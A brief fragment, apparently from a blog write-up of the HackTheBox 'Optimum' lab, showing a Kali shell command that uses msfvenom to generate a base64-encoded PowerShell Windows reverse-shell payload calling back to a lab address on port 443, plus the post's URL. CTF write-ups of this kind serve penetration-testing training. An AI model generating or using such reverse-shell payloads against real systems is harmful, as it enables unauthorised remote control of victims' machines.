
root@Kali:~/HTB/Optimum# msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=10.10.14.65 LPORT=443 --format psh --smallest | msfvenom -a x86 --platform Windows -e powershell/base64 NOEXIT
https://ivanitlearning.wordpress.com/2020/08/01/hackthebox-optimum/
